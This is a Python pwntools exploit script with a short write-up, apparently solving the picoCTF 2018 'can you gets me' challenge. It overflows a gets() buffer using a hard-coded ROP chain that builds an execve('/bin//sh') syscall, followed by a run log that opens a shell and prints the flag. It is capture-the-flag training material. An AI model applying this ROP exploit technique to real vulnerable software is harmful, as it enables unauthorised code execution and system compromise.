from pwn import *

import struct

def p(x):
    return struct.pack("I", x)

r = process("./gets")

# Padding
payload = "A" * (24)
payload += "B" * 4

payload += p(0x0806f02a) # pop edx ; ret
payload += p(0x080ea060) # @ .data
payload += p(0x080b81c6) # pop eax ; ret
payload += '/bin'
payload += p(0x080549db) # mov dword ptr [edx], eax ; ret
payload += p(0x0806f02a) # pop edx ; ret
payload += p(0x080ea064) # @ .data + 4
payload += p(0x080b81c6) # pop eax ; ret
payload += '//sh'
payload += p(0x080549db) # mov dword ptr [edx], eax ; ret
payload += p(0x0806f02a) # pop edx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x08049303) # xor eax, eax ; ret
payload += p(0x080549db) # mov dword ptr [edx], eax ; ret
payload += p(0x080481c9) # pop ebx ; ret
payload += p(0x080ea060) # @ .data
payload += p(0x080de955) # pop ecx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x0806f02a) # pop edx ; ret
payload += p(0x080ea068) # @ .data + 8
payload += p(0x08049303) # xor eax, eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0807a86f) # inc eax ; ret
payload += p(0x0806cc25) # int 0x80

r.sendline(payload)
r.interactive()

"""
Looking at the given binary, we see lots of rop gadgets that we can use to pop a shell.
The most interesting gadget is "int 0x80", which allows us to execute a syscall.
Using ROPGadget, we can automatically generate a rop chain that will execute /bin/sh
and let us view the flag.

james9909@pico-2018-shell-3:/problems/can-you-gets-me_3_17b9ce8807d3d673fc1a70f419b9deef$ python ~/solution.py
[+] Starting local process './gets': pid 4011010
[*] Switching to interactive mode
GIVE ME YOUR NAME!
$ ls
flag.txt  gets    gets.c
$ cat flag.txt
picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}
"""
